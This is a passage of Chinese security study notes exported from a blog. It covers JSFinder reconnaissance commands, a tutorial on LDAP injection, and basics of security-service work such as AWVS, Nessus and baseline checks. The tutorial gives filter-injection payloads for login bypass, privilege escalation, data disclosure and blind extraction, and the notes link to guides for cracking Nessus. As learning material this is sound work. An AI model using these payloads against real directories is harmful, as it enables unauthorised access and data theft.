class="keyword">try</span>:</span><br><span class="line">            strlen = <span class="built_in">len</span>(curstr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res1 = re.findall(patter1, <span class="built_in">str</span>(curstr))</span><br><span class="line">        res2 = re.findall(patter2, <span class="built_in">str</span>(curstr))</span><br><span class="line">        <span class="keyword">if</span> res1:</span><br><span class="line">            <span class="built_in">print</span>(res1)</span><br><span class="line">        <span class="keyword">if</span> res2:</span><br><span class="line">            <span class="built_in">print</span>(res2)</span><br></pre></td></tr></table></figure>

<p>可以提取IP形如：192.168.1.1，192.168.1.1-192.168.1.100</p>
<h3 id="java安全学习"><a href="#java安全学习" class="headerlink" title="java安全学习"></a>java安全学习</h3><h3 id="jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）"><a href="#jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）" class="headerlink" title="jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）"></a>jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）</h3><p><a href="https://blog.csdn.net/qq_41901122/article/details/125151522">(40条消息) JS信息收集工具JSFinder_星球守护者的博客-CSDN博客</a></p>
<p><a href="https://xz.aliyun.com/t/5390">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>
<h4 id="Plus"><a href="#Plus" class="headerlink" title="Plus:"></a>Plus:</h4><p>查看帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3  JSFinderPlus.py -h</span><br></pre></td></tr></table></figure>

<p>简单爬取的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinderPlus.py -u http://202.204.48.66/</span><br></pre></td></tr></table></figure>

<p>深度爬取:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinderPlus.py -u http://202.204.48.66/ -d</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230324223636869.png" alt="image-20230324223636869"></p>
<h4 id="jsFinder"><a href="#jsFinder" class="headerlink" title="jsFinder:"></a>jsFinder:</h4><p><a href="https://xz.aliyun.com/t/5390">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.jd.com/</span><br></pre></td></tr></table></figure>

<p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.jd.com/ -d -ou jd_url.txt -os jd_domain.txt</span><br></pre></td></tr></table></figure>

<p>除了这两种方式以外，还可以批量指定URL和JS链接来获取里面的URL。</p>
<p>指定URL：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -f text.txt</span><br></pre></td></tr></table></figure>

<p>指定JS：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -f text.txt -j</span><br></pre></td></tr></table></figure>

<h3 id="Ldap注入"><a href="#Ldap注入" class="headerlink" title="Ldap注入"></a>Ldap注入</h3><p><a href="https://www.freebuf.com/articles/170322.html">PentesterLab 新手教程（三） ：LDAP攻击 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/vuls/356049.html">Web漏洞那些事儿：LDAP注入 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_45116657/article/details/103943595">LDAP注入入门学习指南_weixin_45116657的博客-CSDN博客</a></p>
<h4 id="Ldap是什么？"><a href="#Ldap是什么？" class="headerlink" title="Ldap是什么？"></a>Ldap是什么？</h4><p><strong>轻型目录访问协议</strong>（英文：Lightweight Directory Access Protocol，缩写：LDAP）。LDAP是一种通讯协议，LDAP支持TCP&#x2F;IP，默认的端口是 389，加密的端口是 636。简单点来说就是，LDAP就是一个数据库，它是用来存储数据的。</p>
<p>但是，LDAP和其他的数据库（如MySQL、SQLserver）是不一样的，MySQL这类数据库的数据是按记录一条条记录存在表中，而LDAP数据库的结构是<strong>树状</strong>的，似于“<strong>目录服务</strong>”的特殊数据库，数据是存储在叶子节点上的。</p>
<p>为什么要用LDAP目录树来存储数据？用MySQL不行吗，为什么非要搞出一个树形的数据库呢？这是因为用树形结构存储数据，查询效率更高（具体为什么，可以看一下关系型数据库索引的实现原理——B树&#x2F;B+树）。在某些特定的场景下，使用树形数据库更理想。比如：需要储存大量的数据，而且数据不是经常更改，需要很快速的查找。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol）和MySQL是两种截然不同的技术。LDAP是一个目录服务协议，用于在网络中存储和查询有关对象（如用户、组、设备）的信息。MySQL是一种关系型数据库管理系统，用于存储、查询和管理结构化数据。</span><br><span class="line"></span><br><span class="line">以下是LDAP和MySQL之间的主要差异：</span><br><span class="line"></span><br><span class="line">数据结构：</span><br><span class="line">LDAP：LDAP数据以树状结构（称为目录信息树，DIT）存储，每个节点（称为条目）包含一组属性及其值。LDAP主要用于存储和查询具有层次结构的数据。</span><br><span class="line">MySQL：MySQL中的数据以表格形式存储，每个表格包含多个行和列。关系型数据库主要用于存储和查询结构化数据。</span><br><span class="line"></span><br><span class="line">查询语言：</span><br><span class="line">LDAP：使用LDAP查询语言（如LDAP搜索过滤器）进行数据查询。</span><br><span class="line">MySQL：使用结构化查询语言（SQL）进行数据查询和管理。</span><br><span class="line"></span><br><span class="line">用途：</span><br><span class="line">LDAP：通常用于身份验证和授权、组织结构和设备管理等场景。例如，LDAP常用于企业网络环境中的单点登录（SSO）和访问控制。</span><br><span class="line">MySQL：适用于存储和查询大量结构化数据的场景，如网站后端数据库、应用程序数据存储等。</span><br><span class="line"></span><br><span class="line">性能和可扩展性：</span><br><span class="line">LDAP：LDAP是为读取操作优化的协议，因此读取性能很高。但是，对于写入操作，LDAP的性能相对较低。LDAP支持复制和分区，可以通过这些特性提高可扩展性。</span><br><span class="line">MySQL：关系型数据库通常在读取和写入性能方面都表现良好。通过分片、复制和分区等技术，MySQL可以实现高可扩展性。</span><br><span class="line">学习曲线：</span><br><span class="line"></span><br><span class="line">LDAP：学习LDAP可能需要更多时间，因为它涉及到目录服务概念、树状结构和查询语法。</span><br><span class="line">MySQL：相对来说，学习MySQL和SQL语言更容易上手。</span><br><span class="line">总之，LDAP和MySQL分别针对不同的应用场景和数据存储需求。LDAP适用于存储和查询具有层次结构的数据，而MySQL适用于存储和查询结构化数据。根据实际需求选择合适的技术是关键。</span><br></pre></td></tr></table></figure>

<h4 id="LDAP查询语法"><a href="#LDAP查询语法" class="headerlink" title="LDAP查询语法"></a>LDAP查询语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设你要树上的一个苹果（一条记录），你怎么告诉园丁它的位置呢？当然首先要说明是哪一棵树（dc，相当于MYSQL的DB），然后是从树根到那个苹果所经过的所有“分叉”（ou），最后就是这个苹果的名字（uid，相当于MySQL表主键id）。好了！这时我们可以清晰的指明这个苹果的位置了，就是那棵“歪脖树”的东边那个分叉上的靠西边那个分叉的再靠北边的分叉上的半红半绿的……，晕了！你直接爬上去吧！</span><br></pre></td></tr></table></figure>

<p>LDAP目录树形结构，存储在叶子节点上：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/1675070455_63d78bf79cd33b1fbaa25.png!small" alt="img" style="zoom:67%;" />

<p>从树根到达目标的位置，可能要经过好几个树杈，所有ou可能有多个值</p>
<p>1、&#x3D;（等于）查询</p>
<p>此 LDAP 参数表明某个属性等于某个值的条件得到满足。例如，如果希望查找“名“属性为“John”的所有对象，可以使用：(givenName&#x3D;John)。</p>
<p>这会返回“名”属性为“John”的所有对象。圆括号是必需的，以便强调 LDAP 语句的开始和结束。</p>
<p>2、&amp;（逻辑与）查询</p>
<p>如果具有多个条件并且希望全部条件都得到满足，则可使用此语法。例如，如果希望查找居住在 Dallas 并且“名”为“John”的所有人员，可以使用：(&amp;(givenName&#x3D;John)(l&#x3D;Dallas))</p>
<p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p>
<p>3、!（逻辑非）查询</p>
<p>此操作符用来排除具有特定属性的对象。假定您需要查找“名”为“John”的对象以外的所有对象。则应使用如下语句：(!givenName&#x3D;John)</p>
<p>此语句将查找“名”不为“John”的所有对象。请注意：! 操作符紧邻参数的前面，并且位于参数的圆括号内。由于本语句只有一个参数，因此使用圆括号将其括起以示说明。</p>
<p>4、（通配符）查询</p>
<p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用：(title&#x3D;*)</p>
<p>这会返回“title”属性包含内容的所有对象。另一个例子是：您知道某个对象的“名”属性的开头两个字母是“Jo”。那么，可以使用如下语法进行查找：(givenName&#x3D;Jo*)</p>
<p>这会返回“名”以“Jo”开头的所有对象。</p>
<h4 id="什么是Ldap注入"><a href="#什么是Ldap注入" class="headerlink" title="什么是Ldap注入"></a>什么是Ldap注入</h4><p>原理</p>
<p>LDAP具有特定的查询结构，并具有特定的语法，来对特定目录进行遍历。LDAP注入攻击和SQL注入攻击类似，利用用户引入的参数生成LDAP查询，由于部分参数没有适当的过滤，因此攻击者可以注入恶意代码以造成恶意攻击。</p>
<p>过滤器结构</p>
<p>LDAP同样基于客户端&#x2F;服务器模型，最常见的操作时使用过滤器搜索目录入口。客户端向服务器发送查询，服务器则响应匹配这些过滤器的目录入口。</p>
<p>LDAP过滤器定义于RFC4515中，这些过滤器的结构可概括如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fileter = (filtercomp)</span><br><span class="line">Filtercomp = and / or / not / item</span><br><span class="line">And = &amp; filterlist</span><br><span class="line">Or = | filterlist</span><br><span class="line">Not = ! filter</span><br><span class="line">Filterlist = 1*filter</span><br><span class="line">Item = simple / present / substring</span><br><span class="line">Simple = “=” / “~=” / ”&gt;=” / “&lt;=”</span><br><span class="line">Present = attr =*</span><br><span class="line">Substring = attr “=” [initial]*[final]</span><br><span class="line">Initial = assertion value</span><br><span class="line">Final = assertion value</span><br></pre></td></tr></table></figure>

<p>所有过滤器必须置于括号中，只有简化的逻辑操作符(AND、OR、NOT)和关系操作符(&#x3D;、&gt;&#x3D;、&lt;&#x3D;、~&#x3D;)可用于构造它们。特殊符“*”可用来替换过滤器中的一个或多个字符。</p>
<p>除使用逻辑操作符外，RFC4256还允许使用下面的单独符号作为两个特殊常量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;)     -&gt;Absolute TRUE </span><br><span class="line">(|)     -&gt;Absolute FALSE </span><br></pre></td></tr></table></figure>

<h4 id="Ldap注入详解"><a href="#Ldap注入详解" class="headerlink" title="Ldap注入详解"></a>Ldap注入详解</h4><p>目前使用得最广泛的LDAP：ADAM（不允许有两个过滤器）和OpenLDAP（第二个过滤器会被忽略）。</p>
<p>最简单的思路：</p>
<p>①(attribute&#x3D;value)</p>
<p>如果过滤器用于构造查询单缺少逻辑操作符，如value)(injected_filter的注入会导致两个过滤器(attribute&#x3D;value)(injected_filter)。在OpenLDAP实施中，第二个过滤器会被忽略（即(injected_filter)，起查询作用的是(attribute&#x3D;value)），只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的，因而这个注入毫无用处。</p>
<p>②(|(attribute&#x3D;value)(second_filter)) or (&amp;(attribute&#x3D;value)(second_filter)):如果第一个（注意，这里“第一个”不是指“(|(attribute&#x3D;value)(second_filter))”，而是指注入导致出现两个过滤器的第一个过滤器。如下面“(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)”的“(&amp;(attribute&#x3D;value)(injected_filter))”）用于构造查询的过滤器有逻辑操作符，形如value)(injected_filter)的注入会变成如下过滤器：(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)。虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符（即“(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)”的“(second_filter)”会被忽略）。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p>
<p>③一些应用框架在将请求发送给服务器之前会检查过滤器是否正确，在这种情况下，过滤器语义上必须是正确的，其注入如：value)(injected_filter))(&amp;(1&#x3D;0。这会导致出现两个不同的过滤器，第二个会被忽略：(&amp;(attribute&#x3D;value)(injected_filter))(&amp;(1&#x3D;0)(second_filter))。</p>
<p>既然第二个过滤器会被LDAP服务器忽略，有些部分便不允许有两个过滤器的查询。这种情况下，只能构建一个特殊的注入以获得单个过滤器的LDAP查询。value)(injected_filter这样的注入产生的结果是：(&amp;(attribute&#x3D;value)(injected_filter)(second_filter))。</p>
<p>测试一个应用是否存在代码注入漏洞典型的方法是向服务器发送会生成一个无效输入的请求，如果服务器返回一个错误消息，那么攻击者就能知道服务器执行了他的查询，他就可以利用代码注入技术来达到攻击的目的。</p>
<p>分为and注入or注入。也可分为盲注有回显两个种类。</p>
<p>详细看这个：<a href="https://www.freebuf.com/vuls/356049.html">Web漏洞那些事儿：LDAP注入 - FreeBuf网络安全行业门户</a></p>
<h4 id="Ldap注入实战"><a href="#Ldap注入实战" class="headerlink" title="Ldap注入实战"></a>Ldap注入实战</h4><p>案例1：绕过访问控制</p>
<p>初始：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER=Uname)(PASSWORD=Pwd)) </span><br></pre></td></tr></table></figure>

<p>我们的输入是Uname、和Pwd</p>
<p>可构造：Uname&#x3D;slisberger)(&amp;))</p>
<p>最后语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER= slisberger)(&amp;))(PASSWORD=Pwd))</span><br></pre></td></tr></table></figure>

<p>LDAP服务器只处理第一个过滤器，即仅查询(&amp;(USER&#x3D;slidberger)(&amp;))得到了处理。这个查询永真，因而攻击者无需有效地密码就能获取对系统的访问(下图)。</p>
<p>案例二：权限提升</p>
<p>现假设下面的查询会向用户列举出所有可见的低安全等级文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=document)(security_level=low)) </span><br></pre></td></tr></table></figure>

<p>这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document)(security_level=*))(&amp;(directory=documents</span><br></pre></td></tr></table></figure>

<p>生成的过滤器为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>

<p>LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))</span><br></pre></td></tr></table></figure>

<p>而</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>

<p>则会被忽略。结果就是，所有安全等级的可用文档都会列举给攻击者，尽管他没有权限查看它们。</p>
<p>案例三：信息泄露</p>
<p>假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。这便是一个典型的OR注入案例，因为用于展示可用资源的查询为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(type=Rsc1)(type=Rsc2))</span><br></pre></td></tr></table></figure>

<p>Rsc1和Rsc2表示系统中不同种类的资源。例如：Rsc1&#x3D;printer，Rsc2&#x3D;scanner用于列出系统中所以可用的打印机和扫描器。</p>
<p>如果攻击者输入Rsc&#x3D;printer)(uid&#x3D;*)，则下面的查询被发送给服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(type=printer)(uid=*))(type=scanner)</span><br></pre></td></tr></table></figure>

<p>LDAP服务器会响应所有的打印机和用户对象。</p>
<p>案例四：信息盲注（可以使用字符集消减加快速度*anywhere*）</p>
<p>攻击者可以使用字母、数字搜索提取属性的值，这个想法的关键在于将一个复杂的值转化为TRUE&#x2F;FALSE列表。这个机制，通常称为booleanization，大意是二值化吧，可用于不同的方式。</p>
<p>假设攻击者想知道department属性的值，处理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))</span><br><span class="line">2、(&amp;(idprinter=HPLaserJet2100)(department=f*))(object=printer))</span><br><span class="line">3、(&amp;(idprinter=HPLaserJet2100)(department=fa*))(object=printer))</span><br></pre></td></tr></table></figure>

<p>本例中department的值是financial，用”a”的尝试没有获取任何打印机信息，因而第一个字母不是”a”。测试过其他字母后，唯一能正常返回的只有”f”，接下来测试第二个字母，当为”i”时才正常返回，以此类推即可获得department的值。</p>
<p>案例五：实战案例：</p>
<p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p>
<p>案例六：实战案例加代码分析（php）</p>
<p><a href="https://www.anquanke.com/post/id/86899">【漏洞分析】CVE-2017-14596：Joomla! LDAP注入导致登录认证绕过漏洞（含演示视频）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>案例七：pentestlab（php）</p>
<p><a href="https://www.freebuf.com/articles/170322.html">PentesterLab 新手教程（三） ：LDAP攻击 - FreeBuf网络安全行业门户</a></p>
<h4 id="LDAP注入危害"><a href="#LDAP注入危害" class="headerlink" title="LDAP注入危害"></a>LDAP注入危害</h4><p>攻击者可以恶意查询LDAP里面的所有数据，导致非常严重的信息泄露。</p>
<h4 id="LDAP防御"><a href="#LDAP防御" class="headerlink" title="LDAP防御"></a>LDAP防御</h4><p>对特殊字符进行过滤和转义。</p>
]]></content>
      <tags>
        <tag>todo</tag>
      </tags>
  </entry>
  <entry>
    <title>安服基本知识</title>
    <url>/2023/03/15/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>记录之前安服时候学的相关知识</p>
<span id="more"></span>



<h2 id="安全服务认知"><a href="#安全服务认知" class="headerlink" title="安全服务认知"></a>安全服务认知</h2><p>keyword：安服项、彩虹计划、解决方案项、安全服务 交付文档规范</p>
<p>tips：不要借安全漏洞做坏事，安服要了解的东西很多</p>
<h3 id="技术类的交互"><a href="#技术类的交互" class="headerlink" title="技术类的交互"></a>技术类的交互</h3><p>给客户做培训类似的</p>
<h3 id="安全测试子类"><a href="#安全测试子类" class="headerlink" title="安全测试子类"></a>安全测试子类</h3><h3 id="咨询服务类"><a href="#咨询服务类" class="headerlink" title="咨询服务类"></a>咨询服务类</h3><p>滴滴被查，数据安全，数据怎么存更安全等。</p>
<p>sdl定义：<a href="https://zhuanlan.zhihu.com/p/252325178">分享|安全开发流程（SDL） - 知乎 (zhihu.com)</a></p>
<h3 id="培训服务类："><a href="#培训服务类：" class="headerlink" title="培训服务类："></a>培训服务类：</h3><p>等级保护对应了解：<a href="https://zhuanlan.zhihu.com/p/349827782">网络安全等级保护分几级？ - 知乎 (zhihu.com)</a></p>
<h3 id="安保服务类"><a href="#安保服务类" class="headerlink" title="安保服务类"></a>安保服务类</h3><h3 id="达到目的"><a href="#达到目的" class="headerlink" title="达到目的"></a>达到目的</h3><h3 id="安全服务要素"><a href="#安全服务要素" class="headerlink" title="安全服务要素"></a>安全服务要素</h3><h3 id="人员分类"><a href="#人员分类" class="headerlink" title="人员分类"></a>人员分类</h3><h3 id="树立网络安全"><a href="#树立网络安全" class="headerlink" title="树立网络安全"></a>树立网络安全</h3><h2 id="漏洞扫描实施"><a href="#漏洞扫描实施" class="headerlink" title="漏洞扫描实施"></a>漏洞扫描实施</h2><h3 id="AWVS使用"><a href="#AWVS使用" class="headerlink" title="AWVS使用"></a>AWVS使用</h3><p>安装参考链接：<a href="https://blog.csdn.net/anlr2020/article/details/118484169">AWVS14.1.2下载安装教程（2021.3.6版本）_awvs下载与安装_an1r的博客-CSDN博客</a></p>
<h4 id="基本设置"><a href="#基本设置" class="headerlink" title="基本设置"></a>基本设置</h4><p>在右上角进行设置，可以设置language为简体，看起来更加舒服</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161733365.png" alt="image-20230316161733365"></p>
<p>左边显示的是菜单，因为刚刚开始用不是很熟练，就简单学下前面几个怎么使用：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161943793.png"></p>
<h4 id="仪表盘"><a href="#仪表盘" class="headerlink" title="仪表盘"></a>仪表盘</h4><p>可以显示当前进行的扫描的进度，以及发现的漏洞的数量等</p>
<p>界面形如：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162415536.png" alt="image-20230316162415536"></p>
<p>要看具体的漏洞，可以点击左边的扫描具体的看。</p>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162701525.png" alt="image-20230316162701525"></p>
<p>分为单个目标，多个目标，目标组</p>
<p>单个目标扫描一个目标，多个目标可以扫描多个目标。</p>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>显示对应的漏洞，具体看图</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162926643.png" alt="image-20230316162926643"></p>
<h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>个人感觉最重要的一个tab</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163005526.png" alt="image-20230316163005526"></p>
<p>可以看目标的状态，也可以新建扫描，可以看到扫的漏洞个数。</p>
<p>点击对应的url可以进入下面的界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163210196.png" alt="image-20230316163210196"></p>
<p>上面圈的可以更加详细的看到对应漏洞及说明，以及扫描出来的网页结构等。</p>
<h4 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h4><p>可以在扫描出生成报告，也可以在此次生成报告，报告种类很多种，暂时还不清楚不同报告类型的差别。</p>
<h3 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h3><h4 id="安装参考链接"><a href="#安装参考链接" class="headerlink" title="安装参考链接"></a>安装参考链接</h4><p><a href="https://www.52pojie.cn/thread-1650667-1-1.html">最详细破解nessus(windows)教程 插件更新至20220613 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.cnblogs.com/Cl0ud/p/13364718.html">Nessus破解没有Scan选项的解决办法 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
<p>上面两个按照顺序弄即可弄好。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230317085903303.png" alt="image-20230317085903303"></p>
<p>然后就可以开始使用了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/smli_ng/article/details/105976795</span><br><span class="line">https://zhuanlan.zhihu.com/p/464866605</span><br><span class="line"></span><br><span class="line">https://www.iculture.cc/software/pig=25546</span><br></pre></td></tr></table></figure>

<h3 id="明鉴扫描系统："><a href="#明鉴扫描系统：" class="headerlink" title="明鉴扫描系统："></a>明鉴扫描系统：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">aes ECB</span><br><span class="line">产品位置：RCwMiXieqCuESTnXAJRat5cujmQTZHAM6RY0Aufkhu7NAt3rsdWc0Nd0eWUIrxho</span><br><span class="line">明鉴系统镜像位置：RCwMiXieqCuESTnXAJRat5cujmQTZHAM6RY0Aufkhu4ylpJP8AtXUNvXEmb4QM4cEXYVygezOCuwuIoV6wXlIM09YaSGPyd7BiNkp+LGmHS3MEy6hvwp6BJdJbnWirhrurgxHKgWFFu5CkRPOFYssA==</span><br></pre></td></tr></table></figure>

<p><a href="https://bbs.dbappsecurity.com.cn/ahproduct">安恒产品 (dbappsecurity.com.cn)</a></p>
<p><a href="https://bbs.dbappsecurity.com.cn/productDetail?detailId=1636194071329329154&productType=download">明鉴漏洞扫描系统-V5.0R01C00SPC104-qcow2格式镜像 (dbappsecurity.com.cn)</a></p>
<p>扫描选桥接模式</p>
<h2 id="基线核查"><a href="#基线核查" class="headerlink" title="基线核查"></a>基线核查</h2><h3 id="基线核查流程"><a href="#基线核查流程" class="headerlink" title="基线核查流程"></a>基线核查流程</h3><p>前期：信息收集。<br>中期：实施阶段。现场检查。<br>后期：报告编写。</p>
<p><del>感觉主要是根据报告模板一个一个检查</del></p>
<h3 id="基线核查方式"><a href="#基线核查方式" class="headerlink" title="基线核查方式"></a>基线核查方式</h3><p>检查方式：</p>
<h4 id="基线检查平台（公司内部平台）："><a href="#基线检查平台（公司内部平台）：" class="headerlink" title="基线检查平台（公司内部平台）："></a>基线检查平台（公司内部平台）：</h4><p>登录对应平台下载工具进行使用。</p>
<ul>
<li>下载脚本</li>
<li>看readme，然后执行命令</li>
<li>之前会生成result，新建项目导入之前的result。</li>
<li>可以生成对应报告，然后对报告进行修改。</li>
</ul>
<h4 id="人工检查："><a href="#人工检查：" class="headerlink" title="人工检查："></a>人工检查：</h4><p>根据手册的checklist进行检查</p>
<p>tips：检查数据库类似的东西小心点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机评估-winodws、linux、AIX、HP-UNIX等</span><br><span class="line">网络设备评估-Cisco、H3C、中兴等</span><br><span class="line">其它设备评估-FTP</span><br><span class="line">数据库评估-Oracle-unix、mysql等</span><br><span class="line">中间件评估-Tomcat、Apache、IIS、Nginx</span><br></pre></td></tr></table></figure>

<h4 id="远程评估系统："><a href="#远程评估系统：" class="headerlink" title="远程评估系统："></a>远程评估系统：</h4><p>略</p>
<h3 id="常见问题及处置"><a href="#常见问题及处置" class="headerlink" title="常见问题及处置"></a>常见问题及处置</h3><p>资产数量大，往往涉及几百台主机。<br>非常规安装，找不到部署目录。<br>输入查询命令，返回为空。<br>软件更新较快，检查版本与客户版本不符合。<br>软件版本差异，部分检查项新版本已无相关配置。发现问题，提出建议后，但软件已无相关配置项。</p>
<h2 id="web安全测试实施"><a href="#web安全测试实施" class="headerlink" title="web安全测试实施"></a>web安全测试实施</h2><p>主要贴图时要清楚</p>
<p>略</p>
<h2 id="互联网敏感信息泄露"><a href="#互联网敏感信息泄露" class="headerlink" title="互联网敏感信息泄露"></a>互联网敏感信息泄露</h2><h3 id="信息资产梳理"><a href="#信息资产梳理" class="headerlink" title="信息资产梳理"></a>信息资产梳理</h3><h4 id="web网站"><a href="#web网站" class="headerlink" title="web网站"></a>web网站</h4><p>子域名收集：挖掘机等</p>
<h4 id="互联网接口（API）"><a href="#互联网接口（API）" class="headerlink" title="互联网接口（API）"></a>互联网接口（API）</h4><p>官方站点搜索<br> 搜索引擎<br> github</p>
<h4 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h4><p>官网<br> 安卓&#x2F;IOS应用商店搜索<br> 搜索引擎</p>
<h4 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h4><p>微信搜索：<a href="https://weixin.sogou.com/">搜狗微信搜索_订阅号及文章内容独家收录，一搜即达 (sogou.com)</a><br> 官网<br> 小程序收录平台</p>
<h4 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h4><p>微信搜索<br> 搜狗搜索<br> 官网</p>
<h3 id="信息泄露情况排查"><a href="#信息泄露情况排查" class="headerlink" title="信息泄露情况排查"></a>信息泄露情况排查</h3><h4 id="敏感信息排查"><a href="#敏感信息排查" class="headerlink" title="敏感信息排查"></a>敏感信息排查</h4><p>网络拓扑、账户&#x2F;密码、邮箱：网盘、github</p>
<h4 id="互联网敏感内容排查"><a href="#互联网敏感内容排查" class="headerlink" title="互联网敏感内容排查"></a>互联网敏感内容排查</h4><p>百度文库、招聘网站、招投标网站</p>
<h4 id="源代码泄露排查"><a href="#源代码泄露排查" class="headerlink" title="源代码泄露排查"></a>源代码泄露排查</h4><p>svn、github、csdn</p>
<h2 id="渗透测试实施"><a href="#渗透测试实施" class="headerlink" title="渗透测试实施"></a>渗透测试实施</h2><p>略（报告模板</p>
<h2 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h2><p>有报告，简单记录下有哪些检查：</p>
<h4 id="客户端环境安全"><a href="#客户端环境安全" class="headerlink" title="客户端环境安全"></a>客户端环境安全</h4><table>
<thead>
<tr>
<th align="center">客户端环境安全</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">安全完整性校验</td>
<td align="center">测试客户端是否存在完整性校验。如果iOS APP客户端未进行完整性校验，攻击者可以通过篡改客户端程序，对普通用户进行钓鱼等攻击。</td>
</tr>
<tr>
<td align="center">反编译保护（可选）</td>
